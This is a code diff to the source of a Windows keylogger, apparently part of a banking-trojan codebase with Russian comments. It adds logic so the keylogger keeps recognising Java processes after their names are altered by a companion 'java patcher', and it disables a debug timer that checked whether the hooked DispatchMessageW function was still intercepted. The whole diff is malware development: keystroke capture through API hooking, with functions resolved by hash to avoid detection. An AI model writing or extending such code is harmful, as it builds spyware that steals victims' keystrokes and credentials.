@@ -1232,7 +1232,19 @@ PKeyLogger KeyLogger::Initialize(PCHAR AppName)
     }
 
 	PCHAR FileName = File::ExtractFileNameA(AppName, false);
-    DWORD H = STR::GetHash(FileName, 0, true);
+	DWORD H = STR::GetHash(FileName, 0, true);
+
+
+	#ifdef JAVS_PATCHERH
+		// При срабатывании чва патчера оригинальные имена процессов
+		// явы меняются, по этому будем проверять на совпадение резудьтирующим
+		// именам ява патчера
+		if (H == AnsiStr::Hash(Patched_Jawa_Name, 0, true))
+			H = PROCESS_HASH_JAVA;
+		else
+		if (H == AnsiStr::Hash(Patched_JawaW_Name, 0, true))
+			H = PROCESS_HASH_JAVAW;
+	#endif
 
 	Logger->ProcessName = STR::New(AppName);
 	Logger->ProcessNameHash = H;
@@ -1311,22 +1323,23 @@ PCHAR KeyLoggerGetSystemName(PKeyLogger Logger)
 
 
 
-VOID CALLBACK TestTimerProc(HWND, UINT, UINT_PTR, DWORD)
-{
-	// Выводим сообщение о рабете кейлогера
-	PKeyLogger L = GetLogger(true);
-	if (L)
-		KLGDBG("---- UnKLG", "Кейлогер работает");
-	else
-    	KLGDBG("---- UnKLG", "Кейлогер отключен");
-
-	const static DWORD Hash_DispatchMessageW = 0x4BAED1DE;
-
-	LPVOID ProcAddr = GetProcAddressEx(NULL, 3, Hash_DispatchMessageW );
-	if (ProcAddr != &KeyLoggerHooks::Hook_DispatchMessageW)
-		KLGDBG("========== UnKLG", "Хук изменён!!!!!");
-
-}
+//VOID CALLBACK TestTimerProc(HWND, UINT, UINT_PTR, DWORD)
+//{
+//	// Выводим сообщение о рабете кейлогера
+//	PKeyLogger L = GetLogger(true);
+//	if (L)
+//		KLGDBG("---- UnKLG", "Кейлогер работает");
+//	else
+//    	KLGDBG("---- UnKLG", "Кейлогер отключен");
+//
+//	const static DWORD Hash_DispatchMessageW = 0x4BAED1DE;
+//
+//	LPVOID* ProcAddr = (LPVOID*)GetProcAddressEx(NULL, 3, Hash_DispatchMessageW );
+//	LPVOID HookAddr = &KeyLoggerHooks::Hook_DispatchMessageW;
+//	if (*ProcAddr != HookAddr)
+//		KLGDBG("========== UnKLG", "Хук изменён!!!!!");
+//
+//}
 
 
 bool KeyLogger::Start()
@@ -1335,8 +1348,6 @@ bool KeyLogger::Start()
 		return false;
 
 
-
-	pSetTimer(NULL, 15, 5000, TestTimerProc);
 
 	// Запуск кейлогера
 
